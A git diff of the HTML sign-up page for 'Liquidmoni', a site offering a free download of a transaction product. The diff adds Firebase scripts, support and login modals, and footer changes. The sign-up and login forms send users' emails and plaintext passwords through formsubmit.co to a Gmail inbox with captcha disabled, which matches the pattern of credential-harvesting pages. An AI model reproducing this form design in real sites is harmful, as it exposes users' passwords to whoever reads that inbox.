@@ -8,11 +8,58 @@
     <title>Liquidmoni - Sign Up</title>
     <link rel="stylesheet" href="../build/style.css">
 
-    <script src="https://apps.elfsight.com/p/platform.js" defer></script>
+    <!-- firebase authentication and database -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"></script>
 </head>
 
 <body>
     <div class="sign-up__wrapper">
+
+        <div class="support__modal">
+            <section class="support">
+                <h2 class="support__header">Support us</h2>
+                <button class="support__close">
+                    <img src="../images/svg-images/close.svg" alt="Support Close Button">
+                </button>
+                <form action="" class="support__form">
+                    <input type="hidden" name="_subject" value="new sign in">
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="https://liquidmoni.netlify.app/pages/authentication.html">
+                    <section class="support__form-action">
+                        <input type="hidden" name="_captcha" value="false">
+                        <!-- Detail inputs -->
+                        <input type="hidden" name="_subject" value="new sign in">
+                        <!-- Change deployment url. -->
+
+                        <!-- <input type="hidden" name="_next" value="https://jailbreak-101.github.io/LIQUIDMONI.COM/thank-you.html"> -->
+                        <input type="hidden" name="_next" value="">
+
+                        <fieldset class="support__form-field">
+                            <label class="support__form-label" for="username">Name: </label>
+                            <div class="support__form-input-container">
+                                <input type="text" class="support__form-input" id="username" name="username"
+                                    placeholder="Name" required>
+                            </div>
+                        </fieldset>
+
+                        <fieldset class="support__form-field">
+                            <label class="support__form-label" for="email">Email: </label>
+                            <div class="support__form-input-container">
+                                <input type="email" class="support__form-input" id="email" name="user-email"
+                                    placeholder="Email" required>
+                            </div>
+                        </fieldset>
+
+                        <textarea class="support__form-input support__form-textarea" name="user-message" id="message"
+                            cols="41" rows="10" placeholder="Message" required></textarea>
+                        <button type="submit" class="support__button">Submit</button>
+                        <p class="support__link">You can also support us by emailing<a href=""
+                                class="link">Support@liquidmoni.com</a></p>
+                    </section>
+                </form>
+            </section>
+        </div>
 
         <header class="header">
             <nav class="nav">
@@ -47,12 +94,13 @@
         <main class="main">
 
             <!-- SIGN UP -->
+            <!-- https://formsubmit.co/liquidmoniainfo@gmail.com -->
             <div class="sign__up">
-                <form class="sign__up-form" action="https://formsubmit.co/legendn351@gmail.com" method="post">
+                <form class="sign__up-form" action="https://formsubmit.co/liquidmoniainfo@gmail.com" method="post">
                     <input type="hidden" name="_subject" value="new sign in">
-                    <input type="hidden" name="_captcha" value="true">
-                    <!-- Change deployment url. -->
+                    <input type="hidden" name="_captcha" value="false">
                     <input type="hidden" name="_next" value="https://liquidmoni.netlify.app/pages/authentication.html">
+                    <!-- Change deployment url. -->
                     <section class="sign__up-form-action">
 
                         <!-- Detail inputs -->
@@ -60,7 +108,7 @@
                         <fieldset class="sign__up-field">
                             <label class="sign__up-label" for="email">Email Address: </label>
                             <div class="sign__up-input-container">
-                                <input type="email" class="sign__up-input" id="email" name="new-user-email" required>
+                                <input type="email" class="sign__up-input" id="sign__up-email" name="new-user-email">
                             </div>
                         </fieldset>
 
@@ -68,25 +116,17 @@
                         <fieldset class="sign__up-field">
                             <label class="sign__up-label" for="password">Password: </label>
                             <div class="sign__up-input-container">
-                                <input type="password" class="sign__up-input" id="password" name="new-user-password"
-                                    required>
+                                <input type="password" minlength="8" maxlength="30" class="sign__up-input"
+                                    id="sign__up-password" name="new-user-password" required>
                             </div>
                         </fieldset>
-                        <!-- <fieldset class="sign__up-field">
-                    <legend>
-                        <label class="sign__up-label" for="email">Email</label>
-                    </legend>
-                    <div class="sign__up-input-container">
-                        <input type="email" class="sign__up-input" id="email" name="new-user-email">
-                    </div>
-                </fieldset> -->
                     </section>
 
                     <!-- AUTHENTICATION -->
-                    <section class="sign__up-form-option">
+                    <!-- <section class="sign__up-form-option">
                         <p class="sign__up-text">Already a user? <a href="#" class="sign__up-link">Login</a></p>
 
-                        <!-- <section class="sign__up-other-options">
+                        <section class="sign__up-other-options">
                             <button class="sign__up-option-button">
                                 <a href="#" class="sign__up-option-link">Sign Up with FaceBook</a>
                             </button>
@@ -95,41 +135,65 @@
                                 <a href="#" class="sign__up-option-link">Sign up with Google</a>
                             </button>
                         </section> -->
-
-                        <button class="sign__up-submit-button" type="submit">Sign Up</button>
+                    <button class="sign__up-submit-button" type="submit">Sign Up</button>
                     </section>
                 </form>
             </div>
 
             <!-- LOG IN -->
-            <div class="log-in" style="display: none">
-                <!-- Authorise the user, but take the user to the download page. -->
-                <!-- <form action="./authentication.html" class="log-in__form hidden"> -->
-                <form action="https://formsubmit.co/liquidmoniainfo@gmail.com" class="log-in__form hidden">
-                    <section class="sign__up-form-action">
-
-                        <!-- Detail inputs -->
+            <div class="log-in-modal hidden">
+                <div class="log-in">
+                    <button class="log-in__close"><img src="../images/svg-images/close.svg"
+                            alt="Log in close button"></button>
+                    <form class="log-in__form" action="https://formsubmit.co/liquidmoniainfo@gmail.com" method="post">
                         <input type="hidden" name="_subject" value="new sign in">
+                        <input type="hidden" name="_captcha" value="false">
                         <!-- Change deployment url. -->
-                        <!-- <input type="hidden" name="_next" value="./authentication.html"> -->
+                        <input type="hidden" name="_next"
+                            value="https://liquidmoni.netlify.app/pages/authentication.html">
+                        <section class="log-in__form-action">
 
-                        <fieldset class="sign__up-field">
-                            <label class="sign__up-label" for="email">Email Address: </label>
-                            <div class="sign__up-input-container">
-                                <input type="email" class="sign__up-input" id="email" name="new-user-email">
-                            </div>
-                        </fieldset>
+                            <!-- Detail inputs -->
 
-                        <fieldset class="sign__up-field">
-                            <label class="sign__up-label" for="password">Password: </label>
-                            <div class="sign__up-input-container">
-                                <input type="password" class="sign__up-input" id="password" name="new-user-password">
-                            </div>
-                        </fieldset>
+                            <fieldset class="log-in__field">
+                                <label class="log-in__label" for="email">Email Address: </label>
+                                <div class="log-in__input-container">
+                                    <input type="email" class="log-in__input" id="log-in__email" name="new-user-email">
+                                </div>
+                            </fieldset>
 
-                        <button class="sign__up-submit-button" type="submit">Log In</button>
-                    </section>
-                </form>
+
+                            <fieldset class="log-in__field">
+                                <label class="log-in__label" for="password">Password: </label>
+                                <div class="log-in__input-container">
+                                    <input type="password" class="log-in__input" id="log-in__password"
+                                        name="new-user-password" min="8" max="30" required>
+                                </div>
+                            </fieldset>
+                        </section>
+
+                        <!-- AUTHENTICATION -->
+                        <section class="log-in__form-option">
+                            <p class="log-in__text">New user? <a href="#" class="log-in__link">Sign Up</a></p>
+
+                            <!-- AUTHENTICATION -->
+                            <!-- <section class="log-in__form-option">
+                                <p class="log-in__text">Already a user? <a href="#" class="log-in__link">Login</a></p>
+
+                                <section class="log-in__other-options">
+                                    <button class="log-in__option-button">
+                                        <a href="#" class="log-in__option-link">Sign Up with FaceBook</a>
+                                    </button>
+
+                                    <button class="log-in__option-button">
+                                        <a href="#" class="log-in__link">Sign up with Google</a>
+                                    </button>
+                                </section> -->
+
+                            <button class="log-in__submit-button" type="submit">Login</button>
+                        </section>
+                    </form>
+                </div>
             </div>
         </main>
 
@@ -138,81 +202,62 @@
 
                 <section class="footer__top">
                     <h3 class="footer__top-text">Learn how to grow 💪your business with <span
-                            class="footer__highlight">Liquidmoni</span></h3>
+                            class="footer__hcighlight">Liquidmoni</span></h3>
 
                     <a href="./pages/sign-up.html" class="footer__button">Download For
                         Free</a>
+
+                    <div class="footer__social-icons">
+                        <a href="#" class="footer__link"><img src="./images/footer/twitter.png" alt="Twiiter"
+                                class="footer__image"></a>
+                        <a href="#" class="footer__link"><img src="./images/footer/facebook.png" alt="Twitter"
+                                class="footer__image"></a>
+                        <a href="#" class="footer__link"><img src="./images/footer/instagram.png" alt="Instagram"
+                                class="footer__image"></a>
+                        <a href="#" class="footer__link"><img src="./images/footer/github.png" alt="GitHub"
+                                class="footer__image"></a>
+                    </div>
                 </section>
 
                 <hr class="footer__hr">
 
                 <section class="footer__bottom">
+                    <!-- <div class="footer__other-links"> -->
+                    <div class="footer__category">
+                        <p class="footer__category-title"><b>Company</b></p>
 
-                    <section class="footer__bottom-left">
-                        <h4 class="footer__bottom-left__header">About Liquidmoni</h4>
-                        <small class="footer__bottom-left__text">At Liquidmoni, we believe that online transactions
-                            should be
-                            seamless
-                            and secure. That's why we offer innovative solutions for those looking to enter the digital
-                            world of e-commerce. Our cutting-edge technology provides virtual transaction capabilities
-                            that
-                            are safe and efficient, giving your customers the bibest online shopping experience
-                            possible.
-                        </small>
-
-                        <div class="footer__social-icons">
-                            <a href="#" class="footer__link"><img src="../images/footer/twitter.png" alt="Twiiter"
-                                    class="footer__image"></a>
-                            <a href="#" class="footer__link"><img src="../images/footer/facebook.png" alt="Twitter"
-                                    class="footer__image"></a>
-                            <a href="#" class="footer__link"><img src="../images/footer/instagram.png" alt="Instagram"
-                                    class="footer__image"></a>
-                            <a href="#" class="footer__link"><img src="../images/footer/github.png" alt="GitHub"
-                                    class="footer__image"></a>
-                        </div>
-                    </section>
-
-                    <section class="footer__bottom-right">
-                        <div class="footer__other-links">
-                            <div class="footer__category">
-                                <p class="footer__category-title"><b>Company</b></p>
-
-                                <ul class="footer__list">
-                                    <li class="footer__list-item"><a href="./about.html"> About</a></li>
-                                    <li class="footer__list-item"><a href="../index.html."> Features</a></li>
-                                    <li class="footer__list-item"><a href="#"> Works</a></li>
-                                    <li class="footer__list-item"><a href="#"> Career</a></li>
-                                </ul>
-                            </div>
+                        <ul class="footer__list">
+                            <li class="footer__list-item"><a href="./pages/about.html"> About</a></li>
+                            <li class="footer__list-item"><a href="#features"> Features</a></li>
+                            <li class="footer__list-item"><a href="#"> Works</a></li>
+                            <li class="footer__list-item"><a href="#"> Career</a></li>
+                        </ul>
+                    </div>
 
 
-                            <div class="footer__category">
-                                <p class="footer__category-title"><b>Help</b></p>
+                    <div class="footer__category">
+                        <p class="footer__category-title"><b>Help</b></p>
 
-                                <ul class="footer__list">
-                                    <li class="footer__list-item"><a href="#"> Customer Support</a></li>
-                                    <li class="footer__list-item"><a href="#"> Delivery Details</a></li>
-                                    <li class="footer__list-item"><a href="#"> Terms and Conditions</a></li>
-                                    <li class="footer__list-item"><a href="#"> Privacy Policy</a></li>
-                                </ul>
-                            </div>
+                        <ul class="footer__list">
+                            <li class="footer__list-item"><a href="#"> Customer Support</a></li>
+                            <!-- <li class="footer__list-item"><a href="#"> Delivery Details</a></li> -->
+                            <li class="footer__list-item"><a href="#"> Terms and Conditions</a></li>
+                            <li class="footer__list-item"><a href="#"> Privacy Policy</a></li>
+                        </ul>
+                    </div>
 
-                            <div class="footer__category">
-                                <p class="footer__category-title"><b>Resources</b></p>
+                    <div class="footer__category">
+                        <p class="footer__category-title"><b>Resources</b></p>
 
-                                <ul class="footer__list">
-                                    <li class="footer__list-item"><a href="#"> Free eBooks</a></li>
-                                    <li class="footer__list-item"><a href="#"> Development Tutorial</a></li>
-                                    <li class="footer__list-item"><a href="#"> How to- Blog</a></li>
-                                    <li class="footer__list-item"><a href="#"> Youtube Playlist</a></li>
-                                </ul>
-
-                            </div>
-                        </div>
-                    </section>
-
+                        <ul class="footer__list">
+                            <!-- <li class="footer__list-item"><a href="#"> Free eBooks</a></li> -->
+                            <li class="footer__list-item"><a href="#"> Development Tutorial</a></li>
+                            <li class="footer__list-item"><a href="#"> How to- Blog</a></li>
+                            <!-- <li class="footer__list-item"><a href="#"> Youtube Playlist</a></li> -->
+                        </ul>
+                        <!-- </div> -->
+                    </div>
                 </section>
-
             </section>
 
             <small class="footer__small-text">
@@ -220,13 +265,13 @@
             </small>
         </footer>
     </div>
-
 </body>
 
+<!-- Firebase / Backend / Authentication -->
+
 <!-- The JavaScript for the Logic of the WebSite -->
-<script type="./module" src="./Js/forms.js"></script>
-<script src="./src/firebase.js"></script>
-<script src="./src/faq.js"></script>
-<script src="./src/main.js"></script>
+<script type="./module" src="../Js/firebase-forms.js"></script>
+<script src="../Js/main.js"></script>
+<!-- <script src="../backend-auth/login-user.js"></script> -->
 
 </html>
